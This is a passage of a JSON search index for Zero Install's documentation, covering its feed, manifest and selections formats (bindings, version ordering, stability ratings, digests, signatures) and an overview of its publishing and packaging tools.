itself.","title":"Bindings"},{"location":"specifications/feed/#environment-bindings","text":"<environment name='...' (insert='...' | value='...') mode='prepend|append|replace' ? separator='...' ? default='...' ? /> * Details of the chosen implementation are passed to the program by setting environment variables, as specified by the <environment> elements (typically, there will be exactly one of these in each <requires> element). Each environment element gives the name of the variable and the relative path of the item within the implementation to insert into the variable's value. Usually, the (badly-named) insert attribute is used, which adds a path to a file or directory inside the implementation to the environment variable. For example, <environment name='PATH' insert='bin'/> would perform something similar to the bash shell statement export PATH=/path/to/impl/bin:$PATH . Alternatively, you can use the value attribute to use a literal string. For example, <environment name='GRAPHICAL_MODE' value='TRUE' mode='replace'/> . This requires 0launch >= 0.52. If mode is prepend (or not set), then the absolute path of the item is prepended to the current value of the variable. The default separator character is the colon character on POSIX systems, and semi-colon on Windows. This can be overridden using separator (0install >= 1.1). If the environment variable is not currently set then the path is prepended to the value of the default attribute. If no default value is given either then the default for that environment variable is used, or the environment variable's value is set to the absolute path directly if there is no default. If mode is append then the same thing happens, except that the new value is added at the end instead of the beginning. If the mode is replace then the old value is overwritten, and the default attribute is ignored. The following environment variables have known defaults and therefore the default attribute is not needed with them: Name Default PATH /bin:/usr/bin XDG_CONFIG_DIRS /etc/xdg XDG_DATA_DIRS /usr/local/share:/usr/share","title":"Environment bindings"},{"location":"specifications/feed/#executable-bindings","text":"These both require 0install >= 1.2. <executable-in-var name='...' command='...' ? /> <executable-in-path name='...' command='...' ? /> These are used when the program needs to run another program. command says which of the program's commands to use; the default is run . <executable-in-var> stores the path of the selected executable in the named environment variable. For example, if a program uses $MAKE to run make, you can provide the required command like this: <requires interface=\"http://repo.roscidus.com/devel/make\"> <executable-in-var name='MAKE'/> </requires> <executable-in-path> works in a similar way, except that it adds a directory containing the executable to $PATH . For example, if the program instead just runs the make command, you would use: <requires interface=\"http://repo.roscidus.com/devel/make\"> <executable-in-path name='make'/> </requires> It is preferable to use <executable-in-var> where possible, to avoid making $PATH very long. Implementation note: On POSIX systems, 0install will create a shell script under ~/.cache/0install.net/injector/executables and pass the path of this script.","title":"Executable bindings"},{"location":"specifications/feed/#generic-bindings","text":"Custom bindings can be specified using the <binding> element (0install >= 2.1). 0install will not know how to run a program using custom bindings itself, but it will include them in any selections documents it creates, which can then be executed by your custom code. The syntax is: <binding path='...' ? command='...' ? ... > ... </binding> If command is given, then 0install will select the given <command> within the implementation (which may cause additional dependencies and bindings to be selected). Otherwise, no command is selected. Any additional attributes and child elements are not processed, but are just passed through. If your binding needs a path within the selected implemention, it is suggested that the path attribute be used for this. Other attributes and child elements should be namespaced to avoid collisions. For example, the EBox application launcher allows each code module to specify its dependencies, which are then available in the module's scope as getters . The ebox-edit application depends on the help library like this: <requires interface=\"http://0install.net/tests/ebox-help.xml\"> <binding e:getter='help'/> </requires>","title":"Generic bindings"},{"location":"specifications/feed/#versions","text":"A version number string has the following form: Version := DottedList (\"-\" Modifier? DottedList?)* DottedList := (Integer (\".\" Integer)*) Modifier := \"pre\" | \"rc\" | \"post\" Numerically, the modifiers come in the order -pre (pre-release), -rc (release candidate), - (no modifier name), -post (post-release or patch level). Versions are ordered like this: 0.1 1 1.0 1.1 1.2-pre 1.2-pre1 1.2-rc1 1.2 1.2-0 1.2-post 1.2-post1-pre 1.2-post1 1.2.1-pre 1.2.1.4 1.2.2 1.2.10 3 0install doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). It is expected that an implementation can be safely replaced by one with a later version number, but not necessarily with an earlier one. So, if an application works with version 1.2.1 of a library then it should also work with version 1.2.2 or 1.3 or even 5.7 , but not 1.2.0 . This is a little different to some other systems, where numbers in different places have different meanings. For example, if the latest version of a library you use is version 5.1, then you shouldn't add the restriction before='5.2' , because when 5.2 comes out it should still work with your program. Of course, this might not always work, and hopefully the problem will be reported while the new library version is marked as testing (before most users hit the problem). Once you know that 5.2 is a problem, you can add the before='5.2' restriction to the implementation then. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface URI. Eg: http://gtk.org/2005/interfaces/GTK-1.2.x (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/2005/interfaces/GTK-2.x (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...) Note that version numbers containing dash characters were not supported before version 0.24 of 0install and so a version-modifier attribute was added to allow new-style versions to be added without breaking older versions. This should no longer be used. The integers in version numbers must be representable as 64-bit signed integers.","title":"Versions"},{"location":"specifications/feed/#stability","text":"The feed file also gives a stability rating for each implementation. The following levels are allowed (must be lowercase in the feed files): stable testing developer buggy insecure Stability ratings are expected to change over time. When any new release is made, its stability should be set to testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to stable so that everyone will use it. If problems are found, it can instead be marked as buggy , or insecure . 0install won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). developer is like a more extreme version of testing , where the program is expected to have bugs.","title":"Stability"},{"location":"specifications/feed/#when-to-use-buggy","text":"Don't mark old releases as buggy every time you do a new release, just because a few bugs have been fixed. People who have selected Network use: Full will automatically upgrade to the new version anyway, so marking an older version as buggy only affects people who have explicitly stated that they don't want to use the latest version, but would prefer to use an older release to save network use.","title":"When to use 'buggy'"},{"location":"specifications/feed/#entry-points","text":"(only used on the Windows version currently) Entry points allow you to associate additional information with <command> names, such as user-friendly names and descriptions. Entry points are used by the Zero Install GUI to help the user choose a command and by the desktop integration system to generate appropriate menu entries for commands. An entry point is not necessary for a command to work but it makes it more discoverable to end-users. Entry points are top-level elements and, unlike commands, are not associated with any specific implementation or group. One entry point represents all commands in all implementations that carry the same name. An entry point has this syntax: <entry-point command='...' binary-name='...' ? > <needs-terminal/> ? <name>...</name> ? <summary>...</summary> ? <description>...</description> ? <icon type='...' href='...'/> * </group> command the name of the command this entry point represents binary-name the canonical name of the binary supplying the command (without file extensions); this is used to suggest suitable alias names. <needs-terminal> if present, this element indicates that the command represented by this entry point requires a terminal in order to run. <name> user-friendly name for the command. If not present, the value of the command attribute is used instead. <summary> a short one-line description; the first word should not be upper-case unless it is a proper noun (e.g. \"cures all ills\") <description> a full description, which can be several paragraphs long <icon> an icon to represent the command; this is used when creating menu entries. You should provide an icon of the type image/png ( .png ) for Linux apps and image/vnd.microsoft.icon ( .ico ) for Windows apps.","title":"Entry points"},{"location":"specifications/feed/#metadata","text":"All elements can contain extension elements, provided they are not in the Zero Install namespace used by the elements defined here. 0install does not currently make use of these elements itself, but other programs may find them useful. In future, some of these may be used (for example, the GUI may display the license terms). The use of Dublin Core is suggested for the following concepts, which have the following meanings when found as a direct child of a <group> or <implementation> element: dc:creator The primary author of the program. dc:publisher The person who created this implementation. For a binary, this is the person who compiled it. Other Dublin Core terms that may be useful include contributor , dateCopyrighted , language , rights and rightsHolder . These terms are not required as they are duplicated by the core Zero Install terms: identifier ( id ), available ( released ) and requires ( requires ). The source element may be used in future to record the source used to build this implementation.","title":"Metadata"},{"location":"specifications/feed/#digital-signatures","text":"When a feed is downloaded from the web, it must contain a digital signature. A feed is signed by appending an XML comment block of the form: <!-- Base64 Signature iD8DBQBEXM/qrgeCgFmlPMERArNSAKDBuNz5SQMZ8rwJmW2fhNHJwor6KwCgwx7XEfY+6gUC90rJ b5eCY+I8HNA= --> This block must go at the end of the file, and contains a Base64-encoded version of the file that would be created by using gpg --detach-sign on the original feed. The signature block must start on a new line, may not contain anything except valid base64 characters, and nothing may follow the signature block. XML signature blocks are supported from version 0.18 of 0install and may be generated easily using the 0publish command. Local interfaces are plain XML, although having an XML signature block is no problem as it will be ignored as a normal XML comment.","title":"Digital signatures"},{"location":"specifications/feed/#valid-architecture-names","text":"The arch attribute is a value in the form OS-CPU . The values come from the uname system call, but there is some normalisation (e.g. because Windows doesn't report the same CPU names as Linux). Valid values for OS include: * Cygwin (a Unix-compatibility layer for Windows) Darwin (MacOSX, without the proprietary bits) FreeBSD Linux MacOSX Windows Valid values for CPU include: * src i386 i486 i586 i686 ppc ppc64 x86_64 armv6l armv7l","title":"Valid architecture names"},{"location":"specifications/feed/#the-if-0install-version-attribute","text":"To make it possible to use newer features in a feed without breaking older versions of 0install, the if-0install-version attribute may be placed on any element to indicate that the element should only be processed by the specified versions of 0install. For example: <group> <new-element if-0install-version='1.14..'/> <fallback if-0install-version='..!1.14'/> </group> In this example, 0install 1.14 and later will see <new-element> , while older versions see <fallback> . The syntax is as described in Constraints . However, 0install versions before 1.13 ignore this attribute and process all elements.","title":"The if-0install-version attribute"},{"location":"specifications/feed/#well-known-extensions","text":"The following are well-known extensions to the Zero Install format: Capabilities (provides information for desktop integration of applications)","title":"Well-known extensions"},{"location":"specifications/feed/#future-plans","text":"The extra meta-data elements need to be better specified. As well as before and not-before, we should support after and not-after. It should be possible to give a delta (binary patch) against a previous version, to make upgrading quicker. It should be possible to scope bindings. For example, when a DTP package requires a clipart package, the clipart package should not be allowed to affect the DTP package's environment.","title":"Future plans"},{"location":"specifications/manifest/","text":"Zero Install implementations are directory trees identified by an algorithm name (e.g., \"sha256\"), and digest of their contents calculated using that algorithm. Adding, deleting, renaming or modifying any file in a tree will change its digest. It should be infeasibly difficult to generate a new tree with the same digest as a given tree. Thus, if you know the digest of the implementation you want, and someone gives you a tree with that digest, you can trust that it is the implementation you want. This document describes how a digest is calculated from a directory tree. Contents: Algorithms Manifest file format Directories Files Symlinks Other files types Ordering Algorithms There are several different algorithms that can be used to generate a digest from a directory tree, so an implementation's identifier includes the algorithm. This allows new algorithms to be added easily if weaknesses are discovered in older ones. The currently supported algorithms are: sha1=XXX This is supported by all versions of 0install. It is less secure than the format used with the other algorithms. sha1new=XXX Supported from version 0.20. This is the same hash as sha1 but with the new manifest format. sha256=XXX Supported from version 0.20 and also requires the hashlib Python module to be installed. sha256new_XXX Supported from version 1.10. This is the same as sha256 , except that the final digest is base32-encoded (without padding) to make it a bit shorter, and the separator character is _ rather than = , as pathnames containing = cause problems for some programs. When checking a new tree (e.g., that has just been downloaded from the net and unpacked), 0install generates a 'manifest' file. The manifest lists every file, directory and symlink in the tree, and gives the digest of each file's content. Here is a sample manifest file for a tree containing two files ( README and src/main.c ) and using the sha1 algorithm (you can use 0store manifest to generate this): F 0a4d55a8d778e5022fab701977c5d840bbc486d0 1132502750 11 README D 1132502769 /src F 83832457b29a423c8e6daf05c6dbcba17d0514dd 1132502769 17 main.c If you generate a manifest file for a directory tree and find that it is identical to the manifest file you want, then you can feel confident that you have the tree you want. This is convenient, because the manifest file is much smaller than the packaged tree. After checking, the generated manifest file is stored in a file called .manifest in the top-level of the tree. To save even more space, we can simply compare the digests (rather than the contents ) of these manifest files. For example, the digest of the three-line manifest file above is given by: $ sha1sum .manifest b848561cd89be1b806ee00008a503c63eb4ad56e When 0install adds a new archive to the cache, the top-level directory is renamed to this final digest (so the main.c above would be stored as .../sha1=b848561cd89be1b806ee00008a503c63eb4ad56e/src/main.c , for example). Because only the digest of the manifest is needed, it is not strictly necessary to store the .manifest file at all. However, if the tree is modified later somehow it can show you exactly which files were changed (rather than just letting you know that the tree has changed in some unknown way). Manifest file format This description of the manifest file is based on Joachim's 12 Oct 2005 post to the zero-install-devel list: The manifest file lists, line by line, all nodes in a directory identified as / , without / itself. All relevant numbers are coded as decimal numbers without leading zeros (unless 0 is to be coded, which is coded as 0 ). Times are represented as the number of seconds since the epoch. Nodes are of one of their possible types: D , F , X , and S . Names must not contain newline characters (the tree will be rejected if they do). The file itself is encoded as UTF-8, with Unix line-endings ( \\n ) and no BOM . Note that some operating systems treat filenames as sequences of bytes (rather than as sequences of characters), and thus may be able to handle filenames which cannot be represented as strings. A Zero Install implementation cannot contain such filenames. Directories D nodes correspond to directories, and their line format is: \"D\", space, [mtime, space,] full path name, newline So, top level directories, for example, would have a \"full path name\" that matches the regular expression ^/[^/\\n]+$ . The modification time is only included when using the original sha1 algorithm, as it was not found to be useful and caused problems with many archives. Files F and X nodes correspond to files and executable files, respectively, and their line formats are: \"F\", space, hash, space, mtime, space, size, space, file name, newline \"X\", space, hash, space, mtime, space, size, space, file name, newline As opposed to directories, no full path names are given. Hence, file names match ^[^/\\n]+$ . The hash is the hexadecimal representation of the digest of the contents of the respective file, using the same digest algorithm as the manifest file itself. Hexadecimal digits a through f are used (rather than A through F). Symlinks S nodes correspond to symbolic links, and their line format is: \"S\", space, hash, space, size, space, symlink name, newline The symlink name is given analogously to file names in F and X nodes. The size of a symlink is the number of bytes in its target (name). The hash sum, similarly to that of files, is the digest of the target (name) of the respective symlink. Other files types It is an error for a tree to contain other types of object (such as device files). Such trees are rejected. Ordering These lines appear in the order of a depth-first search. Within a directory, regular files and symlinks come first (ordered lexicographically by their name, i.e., they appear in the order that LC_ALL=C sort would produce), and then each subdirectory (again sorted in the same way). For the original sha1 algorithm the sort order is slightly different: sub-directories, regular files and symlinks are all sorted together rather than the subdirectories always coming after other types. Implementations have to abide by these rules to the letter because such a file is to be generated automatically and this process absolutely must generate the same file that the directory tree packager had computed.","title":"Manifest files"},{"location":"specifications/manifest/#algorithms","text":"There are several different algorithms that can be used to generate a digest from a directory tree, so an implementation's identifier includes the algorithm. This allows new algorithms to be added easily if weaknesses are discovered in older ones. The currently supported algorithms are: sha1=XXX This is supported by all versions of 0install. It is less secure than the format used with the other algorithms. sha1new=XXX Supported from version 0.20. This is the same hash as sha1 but with the new manifest format. sha256=XXX Supported from version 0.20 and also requires the hashlib Python module to be installed. sha256new_XXX Supported from version 1.10. This is the same as sha256 , except that the final digest is base32-encoded (without padding) to make it a bit shorter, and the separator character is _ rather than = , as pathnames containing = cause problems for some programs. When checking a new tree (e.g., that has just been downloaded from the net and unpacked), 0install generates a 'manifest' file. The manifest lists every file, directory and symlink in the tree, and gives the digest of each file's content. Here is a sample manifest file for a tree containing two files ( README and src/main.c ) and using the sha1 algorithm (you can use 0store manifest to generate this): F 0a4d55a8d778e5022fab701977c5d840bbc486d0 1132502750 11 README D 1132502769 /src F 83832457b29a423c8e6daf05c6dbcba17d0514dd 1132502769 17 main.c If you generate a manifest file for a directory tree and find that it is identical to the manifest file you want, then you can feel confident that you have the tree you want. This is convenient, because the manifest file is much smaller than the packaged tree. After checking, the generated manifest file is stored in a file called .manifest in the top-level of the tree. To save even more space, we can simply compare the digests (rather than the contents ) of these manifest files. For example, the digest of the three-line manifest file above is given by: $ sha1sum .manifest b848561cd89be1b806ee00008a503c63eb4ad56e When 0install adds a new archive to the cache, the top-level directory is renamed to this final digest (so the main.c above would be stored as .../sha1=b848561cd89be1b806ee00008a503c63eb4ad56e/src/main.c , for example). Because only the digest of the manifest is needed, it is not strictly necessary to store the .manifest file at all. However, if the tree is modified later somehow it can show you exactly which files were changed (rather than just letting you know that the tree has changed in some unknown way).","title":"Algorithms"},{"location":"specifications/manifest/#manifest-file-format","text":"This description of the manifest file is based on Joachim's 12 Oct 2005 post to the zero-install-devel list: The manifest file lists, line by line, all nodes in a directory identified as / , without / itself. All relevant numbers are coded as decimal numbers without leading zeros (unless 0 is to be coded, which is coded as 0 ). Times are represented as the number of seconds since the epoch. Nodes are of one of their possible types: D , F , X , and S . Names must not contain newline characters (the tree will be rejected if they do). The file itself is encoded as UTF-8, with Unix line-endings ( \\n ) and no BOM . Note that some operating systems treat filenames as sequences of bytes (rather than as sequences of characters), and thus may be able to handle filenames which cannot be represented as strings. A Zero Install implementation cannot contain such filenames.","title":"Manifest file format"},{"location":"specifications/manifest/#directories","text":"D nodes correspond to directories, and their line format is: \"D\", space, [mtime, space,] full path name, newline So, top level directories, for example, would have a \"full path name\" that matches the regular expression ^/[^/\\n]+$ . The modification time is only included when using the original sha1 algorithm, as it was not found to be useful and caused problems with many archives.","title":"Directories"},{"location":"specifications/manifest/#files","text":"F and X nodes correspond to files and executable files, respectively, and their line formats are: \"F\", space, hash, space, mtime, space, size, space, file name, newline \"X\", space, hash, space, mtime, space, size, space, file name, newline As opposed to directories, no full path names are given. Hence, file names match ^[^/\\n]+$ . The hash is the hexadecimal representation of the digest of the contents of the respective file, using the same digest algorithm as the manifest file itself. Hexadecimal digits a through f are used (rather than A through F).","title":"Files"},{"location":"specifications/manifest/#symlinks","text":"S nodes correspond to symbolic links, and their line format is: \"S\", space, hash, space, size, space, symlink name, newline The symlink name is given analogously to file names in F and X nodes. The size of a symlink is the number of bytes in its target (name). The hash sum, similarly to that of files, is the digest of the target (name) of the respective symlink.","title":"Symlinks"},{"location":"specifications/manifest/#other-files-types","text":"It is an error for a tree to contain other types of object (such as device files). Such trees are rejected.","title":"Other files types"},{"location":"specifications/manifest/#ordering","text":"These lines appear in the order of a depth-first search. Within a directory, regular files and symlinks come first (ordered lexicographically by their name, i.e., they appear in the order that LC_ALL=C sort would produce), and then each subdirectory (again sorted in the same way). For the original sha1 algorithm the sort order is slightly different: sub-directories, regular files and symlinks are all sorted together rather than the subdirectories always coming after other types. Implementations have to abide by these rules to the letter because such a file is to be generated automatically and this process absolutely must generate the same file that the directory tree packager had computed.","title":"Ordering"},{"location":"specifications/selections/","text":"This document describes the format of 0install's XML selections documents. A selections document contains all the information needed to launch a program. 0install generates a selections document by collecting information from multiple feeds and then running a solver to choose the best combination of components. For example, to generate the selections document for the ROX Edit application: $ 0install select --xml http://rox.sourceforge.net/2005/interfaces/Edit For an app , foo , the current selections can be found in ~/.config/0install.net/apps/foo/selections.xml . For binaries generated by 0compile , the selections used to build it can be found in the 0install directory of the binary package, in the build-environment.xml file. Contents: <selections> Historical notes <selection> Executing the selections Checking the selections are up-to-date Processing bindings Future plans <selections> A selections document contains a set of selections, one per selected interface. <?xml version=\"1.0\" ?> <selections xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\" interface=\"...\" command=\"...\" ? source=\"true|false\" ? > [ selection ] + </selections> interface The URI of the main program being run (e.g. \"http://rox.sourceforge.net/2005/interfaces/Edit\"). command The name of the (optional) <command> to run on the main program (e.g. \"run\"). source Indicates whether the root is source or binary (since 0install 2.8). This is useful if implementations of both are present. Historical notes Before 0install 1.2, there was no command attribute on the root. Instead, the root <selections> element also contained a set of <command> elements as direct children. The first <command> was for the main interface, the second was for its <runner> and so on. In later versions, the commands go inside their <selection> elements, which is needed to support executable bindings. Before 0install 0.51, there were no commands at all. Instead, the <selection> for the main interface had a main attribute which was used (the command should be treated as \"run\" in this case). <selection> <selection interface=\"...\" from-feed=\"...\" ? local-path=\"...\" ? quick-test-file=\"...\" ? requires-compilation=\"true\" ? ... > [ dependencies ] [ bindings ] [ digests ] [ commands ] </selection> interface Indicates that this is the selected implementation of this interface. from-feed The URL of the feed which provided this implementation. If missing, use the value of interface . local-path For local implementations , this is the path of the directory containing the implementation. quick-test-file A file which, if present, indicates that the selection is still valid. This is sometimes used with distribution-provided selections. If not present and the ID starts with \"package:\", you'll need to query the distribution's package manager to check that this version is still installed. requires-compilation If present, this attribute indicates that the selection does not yet exist, but could be compiled from the source implementation with the same id . Such selections can be generated when using 0install select --may-compile (0install >= 2.9). Other attributes All attributes from the selected <implementation> are included on the <selection> , except for stability and the deprecated main and self-test attributes, which were replaced by commands. The most useful ones are id and version . The dependencies , bindings , digests and commands are defined in the feed specification . <restricts> elements are not included. As in feed files, the id may also be used as a digest or a local path in older documents. See the feed specification for details. Executing the selections 0install performs the following steps when running an app: Load the saved selections XML (or do an update if missing). Check that they are valid and up-to-date. Process all the bindings to set up the new environment. Build the command line arguments, starting with the main command and following the chain of <runner> s. Exec the new process. Checking the selections are up-to-date This is how 0install checks the selections for an app before running them: If any input files have changed or disappeared since the solver last ran, we re-run the solver. The files checked are: The previously selected feed files (local or cached). Configuration files for the selected interfaces (e.g. preferred stability). The global configuration file (e.g. preferred stability). 0install currently ignores feeds and interfaces which were considered but not selected. If any selections are no longer present, we rerun the solver. For distribution packages, we check that the version hasn't changed. If it has been a while since we checked for updates, we trigger a background update but run the current selections anyway. Processing bindings For each <selection> , 0install will: Process all bindings directly inside the <selection> . Process all dependencies directly inside the <selection> : Find the selection for the required interface (note: may be missing for non-essential dependencies). Process all bindings inside the dependency. Process all commands directly inside the <selection> : Process all bindings inside the command. Process all dependencies inside the command, including their bindings (as above) and also including any <runner> . Having located all the bindings: Calculate the environment for the new process by expanding all <environment> bindings. Process all <executable-in-var> and <executable-in-path> bindings. Note: you must do this after expanding all other environment variables because of $-expansion in <arg> . A binding directly inside a <selection> or <command> binds a selection to itself (e.g. a Python library may wish to add itself to PYTHONPATH). Bindings inside dependencies bind to the dependency (e.g. a Python program may wish to add a library to PYTHONPATH ). A distribution-provided selection does not have a path, and so any <environment> bindings for it are skipped (e.g. it's up to the distribution package manager to ensure that Python libraries it provides are in the default search path). Future plans Indexing the selections by interface URI is a bit restrictive. Once we get scoping, we'll need to cope with e.g. a Python 2 program that depends on a Python 3 program, which will require two different selections for the Python interface.","title":"Selections files"},{"location":"specifications/selections/#selections62","text":"A selections document contains a set of selections, one per selected interface. <?xml version=\"1.0\" ?> <selections xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\" interface=\"...\" command=\"...\" ? source=\"true|false\" ? > [ selection ] + </selections> interface The URI of the main program being run (e.g. \"http://rox.sourceforge.net/2005/interfaces/Edit\"). command The name of the (optional) <command> to run on the main program (e.g. \"run\"). source Indicates whether the root is source or binary (since 0install 2.8). This is useful if implementations of both are present.","title":"&lt;selections>"},{"location":"specifications/selections/#historical-notes","text":"Before 0install 1.2, there was no command attribute on the root. Instead, the root <selections> element also contained a set of <command> elements as direct children. The first <command> was for the main interface, the second was for its <runner> and so on. In later versions, the commands go inside their <selection> elements, which is needed to support executable bindings. Before 0install 0.51, there were no commands at all. Instead, the <selection> for the main interface had a main attribute which was used (the command should be treated as \"run\" in this case).","title":"Historical notes"},{"location":"specifications/selections/#selection62","text":"<selection interface=\"...\" from-feed=\"...\" ? local-path=\"...\" ? quick-test-file=\"...\" ? requires-compilation=\"true\" ? ... > [ dependencies ] [ bindings ] [ digests ] [ commands ] </selection> interface Indicates that this is the selected implementation of this interface. from-feed The URL of the feed which provided this implementation. If missing, use the value of interface . local-path For local implementations , this is the path of the directory containing the implementation. quick-test-file A file which, if present, indicates that the selection is still valid. This is sometimes used with distribution-provided selections. If not present and the ID starts with \"package:\", you'll need to query the distribution's package manager to check that this version is still installed. requires-compilation If present, this attribute indicates that the selection does not yet exist, but could be compiled from the source implementation with the same id . Such selections can be generated when using 0install select --may-compile (0install >= 2.9). Other attributes All attributes from the selected <implementation> are included on the <selection> , except for stability and the deprecated main and self-test attributes, which were replaced by commands. The most useful ones are id and version . The dependencies , bindings , digests and commands are defined in the feed specification . <restricts> elements are not included. As in feed files, the id may also be used as a digest or a local path in older documents. See the feed specification for details.","title":"&lt;selection>"},{"location":"specifications/selections/#executing-the-selections","text":"0install performs the following steps when running an app: Load the saved selections XML (or do an update if missing). Check that they are valid and up-to-date. Process all the bindings to set up the new environment. Build the command line arguments, starting with the main command and following the chain of <runner> s. Exec the new process.","title":"Executing the selections"},{"location":"specifications/selections/#checking-the-selections-are-up-to-date","text":"This is how 0install checks the selections for an app before running them: If any input files have changed or disappeared since the solver last ran, we re-run the solver. The files checked are: The previously selected feed files (local or cached). Configuration files for the selected interfaces (e.g. preferred stability). The global configuration file (e.g. preferred stability). 0install currently ignores feeds and interfaces which were considered but not selected. If any selections are no longer present, we rerun the solver. For distribution packages, we check that the version hasn't changed. If it has been a while since we checked for updates, we trigger a background update but run the current selections anyway.","title":"Checking the selections are up-to-date"},{"location":"specifications/selections/#processing-bindings","text":"For each <selection> , 0install will: Process all bindings directly inside the <selection> . Process all dependencies directly inside the <selection> : Find the selection for the required interface (note: may be missing for non-essential dependencies). Process all bindings inside the dependency. Process all commands directly inside the <selection> : Process all bindings inside the command. Process all dependencies inside the command, including their bindings (as above) and also including any <runner> . Having located all the bindings: Calculate the environment for the new process by expanding all <environment> bindings. Process all <executable-in-var> and <executable-in-path> bindings. Note: you must do this after expanding all other environment variables because of $-expansion in <arg> . A binding directly inside a <selection> or <command> binds a selection to itself (e.g. a Python library may wish to add itself to PYTHONPATH). Bindings inside dependencies bind to the dependency (e.g. a Python program may wish to add a library to PYTHONPATH ). A distribution-provided selection does not have a path, and so any <environment> bindings for it are skipped (e.g. it's up to the distribution package manager to ensure that Python libraries it provides are in the default search path).","title":"Processing bindings"},{"location":"specifications/selections/#future-plans","text":"Indexing the selections by interface URI is a bit restrictive. Once we get scoping, we'll need to cope with e.g. a Python 2 program that depends on a Python 3 program, which will require two different selections for the Python interface.","title":"Future plans"},{"location":"tools/","text":"This section contains various utility programs that make using Zero Install easier. Publishing and updating feeds Compiling Testing Sharing Security Publishing and updating feeds 0downstream 0downstream can be used to automatically create and update feed files for an existing open source project page on a site like github, pypi or rubygems.org. 0publish 0publish edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. It is particularly useful in release scripts. 0release 0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed. 0repo 0repo helps you to maintain a repository of 0install software for others to use. It takes a new release generated by e.g. 0template and adds it to its collection. Then it generates a set of static files which you can upload to your web hosting provider. mkzero mkzero is a light-weight alternative to 0release. It doesn't support version control integration, tagging, or local feeds. It is useful for quickly publishing simple packages. 0template 0template generates the XML for one version of a program from a template. It is a useful replacement for 0downstream for more complex programs (e.g. source code that must be compiled or programs with dependencies). pkg2zero pkg2zero publishes a Debian or RPM package in a Zero Install feed. pom2feed The Zero Install Maven Integration connects the world of Zero Install with Apache Maven. With this project Zero Install gets access to the huge number of Java projects available at Maven Central. This is made possible by two components: the pom2feed-service and the pom2feed-maven-plugin. Zero Install Publishing tools (.NET) A .NET equivalent of 0publish-GUI (e.g. for Windows). Compiling 0compile 0compile creates binaries from source code, either for your own use or ready for publishing on the web through Zero Install. It can use Zero Install to download any build dependencies (compilers, header files, build tools, etc). This is useful if there is no binary for your platform, or if you wish to modify the program in some way. Make-headers Make-headers is an extremely simple script for creating -dev packages (packages containing only header files) from ordinary source releases. Testing 0test 0test runs the self-tests for a given program with various version combinations. FeedLint If you maintain a number of feeds, each with several versions of your programs, how do you know that all the download links are still OK? Run FeedLint on your feeds from time-to-time to check. Sharing 0export 0export creates a self-extracting installer for a given program, for distribution on CDs, etc. 0mirror 0mirror keeps an archive of Zero Install feeds and GnuPG keys and exports them for publishing on a web-server. 0share 0share allows peer-to-peer sharing of Zero Install packages. Security ebox ebox proof-of-concept sandboxing system.","title":"Overview"},{"location":"tools/#publishing-and-updating-feeds","text":"0downstream 0downstream can be used to automatically create and update feed files for an existing open source project page on a site like github, pypi or rubygems.org. 0publish 0publish edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. It is particularly useful in release scripts. 0release 0release can be used to make new releases of your software. It handles details such as setting the version number and release date, tagging the release in your version control system and updating your Zero Install feed. 0repo 0repo helps you to maintain a repository of 0install software for others to use. It takes a new release generated by e.g. 0template and adds it to its collection. Then it generates a set of static files which you can upload to your web hosting provider. mkzero mkzero is a light-weight alternative to 0release. It doesn't support version control integration, tagging, or local feeds. It is useful for quickly publishing simple packages. 0template 0template generates the XML for one version of a program from a template. It is a useful replacement for 0downstream for more complex programs (e.g. source code that must be compiled or programs with dependencies). pkg2zero pkg2zero publishes a Debian or RPM package in a Zero Install feed. pom2feed The Zero Install Maven Integration connects the world of Zero Install with Apache Maven. With this project Zero Install gets access to the huge number of Java projects available at Maven Central. This is made possible by two components: the pom2feed-service and the pom2feed-maven-plugin. Zero Install Publishing tools (.NET) A .NET equivalent of 0publish-GUI (e.g. for Windows).","title":"Publishing and updating feeds"},{"location":"tools/#compiling","text":"0compile 0compile creates binaries from source code, either for your own use or ready for publishing on the web through Zero Install. It can use Zero Install to download any build dependencies (compilers, header files, build tools, etc). This is useful if there is no binary for your platform, or if you wish to modify the program in some way. Make-headers Make-headers is an extremely simple script for creating -dev packages (packages containing only header files) from ordinary source releases.","title":"Compiling"},{"location":"tools/#testing","text":"0test 0test runs the self-tests for a given program with various version combinations. FeedLint If you maintain a number of feeds, each with several versions of your programs, how do you know that all the download links are still OK? Run FeedLint on your feeds from time-to-time to check.","title":"Testing"},{"location":"tools/#sharing","text":"0export 0export creates a self-extracting installer for a given program, for distribution on CDs, etc. 0mirror 0mirror keeps an archive of Zero Install feeds and GnuPG keys and exports them for publishing on a web-server. 0share 0share allows peer-to-peer sharing of Zero Install packages.","title":"Sharing"},{"location":"tools/#security","text":"ebox ebox proof-of-concept sandboxing system.","title":"Security"},{"location":"tools/0bootstrap/","text":"Name: 0bootstrap Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/tools/0bootstrap.xml 0bootstrap generates a native package that installs a 0install launcher. This program is not ready for use yet. Normally, a launcher is created by passing its name (a URI) to the 0desktop command (or \"Add New Program\"). This downloads the appropriate feeds, their icons - if available, and makes a shortcut (creates a launcher, a .desktop file). However, it is sometimes useful to bundle such a launcher and its icon together in a .deb package (for example), so that it can be installed on machines that don't have Zero Install available initially - by using the standard native package installation procedure. 0bootstrap takes the URI of a program and creates a native package; currently the .deb and .rpm package formats are supported by the tool. Programs launched using these packages are added to the Zero Install cache and are therefore still shared between users , and will get updates over the web where possible. Contents: Using a 0bootstrap package Current status Installing 0bootstrap Creating a package for your program FAQ Using a 0bootstrap package Open the file with your file manager, or run gdebi-gtk edit.deb in a terminal: The package will require Zero Install in order to install, as seen in the Details view: Installing native packages requires authentication. The installation will add the program to your menus. Current status This program is not yet released. Installing 0bootstrap You can download 0bootstrap and create a short-cut to 